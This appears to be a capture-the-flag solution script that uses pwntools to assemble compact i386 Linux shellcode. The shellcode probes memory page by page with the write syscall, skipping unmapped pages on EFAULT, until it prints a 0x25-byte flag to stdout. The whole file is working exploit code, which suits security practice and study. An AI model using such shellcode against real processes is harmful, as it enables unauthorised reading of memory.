#!/usr/bin/env python3

from pwn import *
from re import sub

shellcode = """
_start:
    mov ecx, 0x5fff0000     ; minimum start address - 0x10000
    xor ebx, ebx
    inc ebx                 ; fd stdout
    push 0x25               ; flag len
    pop edx

loop:
    push 0x4                ; syscall write
    pop eax
    add ecx, 0x10000        ; minimum page difference from << 16
    int 0x80
    cmp eax, 0xfffffff2     ; EFAULT
    jz loop                 ; loop if EFAULT

exit:
    xor eax, eax
    mov ebx, eax
    inc eax       ;syscall exit
    int 0x80
"""

shellcode = re.sub(";.*\n", "\n", shellcode)

shellcode = asm(shellcode, arch = 'i386', os = 'linux')

if len(shellcode) > 0x3c:
    raise Exception('shellcode too long', len(shellcode))

print("shellcode len:", len(shellcode), file=sys.stderr)
print(disasm(shellcode), file=sys.stderr)

sys.stdout.buffer.write(shellcode)
